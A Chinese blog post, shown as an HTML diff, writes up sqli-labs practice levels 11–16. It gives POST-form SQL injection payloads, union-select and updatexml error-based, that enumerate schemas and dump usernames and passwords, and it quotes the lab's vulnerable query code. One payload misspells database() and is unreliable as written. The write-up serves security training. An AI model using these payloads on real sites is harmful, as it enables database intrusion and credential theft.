@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>sqli-lab-11~16的wp | past</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="sqli-lab-11~16  使用sqli-lab靶场  这是关于11~16关的简单讲解  11~16关实际上使用的指令和1~10关基本一样 只不过是将注入的地方切换到输入框或者bp之中 这边只使用第11题的完整过程 第十一题 打开靶场，发现页面出现的是账号密码登入界面,可以知道注入方式应该为post型 打开bp，抓包,将请求包发送到重发器之中:  然后在username后面构造: -1&#39; 确定">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-lab-11~16的wp">
+<meta property="og:url" content="https://xiafujian.github.io/2026/10/08/sqli-lab-11~16/index.html">
+<meta property="og:site_name" content="past">
+<meta property="og:description" content="sqli-lab-11~16  使用sqli-lab靶场  这是关于11~16关的简单讲解  11~16关实际上使用的指令和1~10关基本一样 只不过是将注入的地方切换到输入框或者bp之中 这边只使用第11题的完整过程 第十一题 打开靶场，发现页面出现的是账号密码登入界面,可以知道注入方式应该为post型 打开bp，抓包,将请求包发送到重发器之中:  然后在username后面构造: -1&#39; 确定">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-11~16/1.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-11~16/2.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-11~16/3.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-11~16/4.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-11~16/5.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-11~16/6.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-11~16/7.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-11~16/8.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-11~16/9.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-11~16/10.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-11~16/11.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-11~16/15.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/sqli-lab-11~16/14.png">
+<meta property="article:published_time" content="2026-10-08T13:02:26.601Z">
+<meta property="article:modified_time" content="2026-10-08T13:58:25.851Z">
+<meta property="article:author" content="past">
+<meta property="article:tag" content="SQL">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xiafujian.github.io/image/sqli-lab-11~16/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="past" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">past</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">my blog</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://xiafujian.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-sqli-lab-11~16" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/10/08/sqli-lab-11~16/" class="article-date">
+  <time class="dt-published" datetime="2026-10-08T13:02:26.601Z" itemprop="datePublished">2026-10-08</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/sqli-lab/">sqli-lab</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      sqli-lab-11~16的wp
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1>sqli-lab-11~16</h1>
+<ul>
+<li>使用sqli-lab靶场</li>
+</ul>
+<p><strong>这是关于11~16关的简单讲解</strong><br>
+<br></p>
+<p><code>11~16关实际上使用的指令和1~10关基本一样</code><br>
+<code>只不过是将注入的地方切换到输入框或者bp之中</code><br>
+<code>这边只使用第11题的完整过程</code></p>
+<p><strong>第十一题</strong><br>
+打开靶场，发现页面出现的是账号密码登入界面,可以知道注入方式应该为post型<br>
+打开bp，抓包,将请求包发送到重发器之中:</p>
+<p><img src="/image/sqli-lab-11~16/1.png" alt="alt text"></p>
+<p>然后在username后面构造:<br>
+<code>-1' </code>确定闭合方式</p>
+<p><img src="/image/sqli-lab-11~16/2.png" alt="alt text"></p>
+<p>接下来就是老步骤了:<br>
+<code>-1' or 1=1 --+</code>确定显示方式</p>
+<p><img src="/image/sqli-lab-11~16/3.png" alt="alt text"></p>
+<p><code>-1' union select 1,datebase() --+</code>获取数据库名称</p>
+<p><img src="/image/sqli-lab-11~16/4.png" alt="alt text"></p>
+<p>不过中间有点小插曲<code>-1' union select 1,datebase() limit 1,1--+</code>开始会没有回显<br>
+<img src="/image/sqli-lab-11~16/5.png" alt="alt text"><br>
+于是直接使用<br>
+<code>-1' union select 1,group_concat(schema_name) from information_schema.schemata --+</code>来获取全部的数据库名称</p>
+<p><img src="/image/sqli-lab-11~16/6.png" alt="alt text"></p>
+<p><code>-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security' --+</code>来获取表名</p>
+<p><img src="/image/sqli-lab-11~16/7.png" alt="alt text"></p>
+<p><code>-1' union select 1,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'--+</code><br>
+来获取列名</p>
+<p><img src="/image/sqli-lab-11~16/8.png" alt="alt text"></p>
+<p>最后使用<code>-1' union select 1,group_concat(username,0x7c,password) from security.users --+</code>来脱库获取数据</p>
+<p><img src="/image/sqli-lab-11~16/9.png" alt="alt text"><br>
+<br><br></p>
+<p>第12题就是将<code>'</code> 改为<code>&quot;)</code><br>
+即<code>-1&quot;) union select 1,group_concat(username,0x7c,password) from security.users --+</code></p>
+<p><br><br></p>
+<p>第13题是无回显,使用updatemxl报错注入即可<br>
+最后的payload为:<br>
+<code>1') and updatexml(1,concat(0x7c,(select group_concat(username,0x7c,password) from security.users),0x7c),1) -- </code><br>
+<br><br></p>
+<p>第14题和13题差不多,将<code>')</code>改为<code>&quot;</code><br>
+<code>1&quot; and updatexml(1,concat(0x7c,(select group_concat(username,0x7c,password) from security.users),0x7c),1) -- </code><br>
+<br><br></p>
+<p>第15，16题分别是布尔盲注和时间盲注，和之前一样使用自动化脚本跑</p>
+<p><strong>总结下来就是下表</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">关卡</th>
+<th style="text-align:center">闭合符号</th>
+<th style="text-align:center">注入类型</th>
+<th style="text-align:center">核心特点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Less11</td>
+<td style="text-align:center">'</td>
+<td style="text-align:center">联合查询 / 报错注入</td>
+<td style="text-align:center">POST 表单登录框，有回显</td>
+</tr>
+<tr>
+<td style="text-align:center">Less12</td>
+<td style="text-align:center">&quot;)</td>
+<td style="text-align:center">联合查询 / 报错注入</td>
+<td style="text-align:center">双引号 + 括号闭合</td>
+</tr>
+<tr>
+<td style="text-align:center">Less13</td>
+<td style="text-align:center">')</td>
+<td style="text-align:center">报错注入</td>
+<td style="text-align:center">单引号 + 括号，仅报错回显，无数据回显</td>
+</tr>
+<tr>
+<td style="text-align:center">Less14</td>
+<td style="text-align:center">&quot;</td>
+<td style="text-align:center">报错注入</td>
+<td style="text-align:center">双引号闭合报错注入</td>
+</tr>
+<tr>
+<td style="text-align:center">Less15</td>
+<td style="text-align:center">'</td>
+<td style="text-align:center">布尔 / 时间盲注</td>
+<td style="text-align:center">页面无报错，只有登录成功 / 失败两种状态</td>
+</tr>
+<tr>
+<td style="text-align:center">Less16</td>
+<td style="text-align:center">&quot;)</td>
+<td style="text-align:center">布尔 / 时间盲注</td>
+<td style="text-align:center">双引号 + 括号闭合盲注</td>
+</tr>
+</tbody>
+</table>
+<p><br><br><br></p>
+<p>上面主要是使用bp的操作<br>
+其实直接在网页的输入框里面也可以进行注入:</p>
+<p><img src="/image/sqli-lab-11~16/10.png" alt="alt text"></p>
+<p>但是需要注意的是:<br>
+输入框里面应该是不识别 <code>--+</code> 里面的 <code>+</code><br>
+如果你不在<code>--</code>后面输入空格，语法会不对,所以需要将<code>--+</code>修改为<code>-- </code>(最后有一个空格)</p>
+<p><img src="/image/sqli-lab-11~16/11.png" alt="alt text"></p>
+<p><br><br><br></p>
+<p><img src="/image/sqli-lab-11~16/15.png" alt="alt text"><br>
+<img src="/image/sqli-lab-11~16/14.png" alt="alt text"><br>
+对比一下get型和post型的源代码区别:<br>
+POST:<br>
+<code>@$sql=&quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1&quot;;</code><br>
+GET:<br>
+<code>$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;</code><br>
+主要就是注入入口由id后面变成username后面</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://xiafujian.github.io/2026/10/08/sqli-lab-11~16/" data-id="cuidiA0yV_9Guv5ol3vcgk7Jb" data-title="sqli-lab-11~16的wp" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL/" rel="tag">SQL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2026/09/29/sqli-lab-8~10/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">sqli-lab-8~10的wp</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/sqli-lab/">sqli-lab</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL/" rel="tag">SQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/SQL/" style="font-size: 10px;">SQL</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/10/">十月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/09/">九月 2026</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2026/10/08/sqli-lab-11~16/">sqli-lab-11~16的wp</a>
+          </li>
+        
+          <li>
+            <a href="/2026/09/29/sqli-lab-8~10/">sqli-lab-8~10的wp</a>
+          </li>
+        
+          <li>
+            <a href="/2026/09/28/sqli-lab-7/">sqli-lab-7的wp</a>
+          </li>
+        
+          <li>
+            <a href="/2026/09/27/sqli-lab-5~6/">sqli-lab-5~6的wp</a>
+          </li>
+        
+          <li>
+            <a href="/2026/09/26/sqli-lab-2~4/">sqli-lab-sql2~4的wp</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 past<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
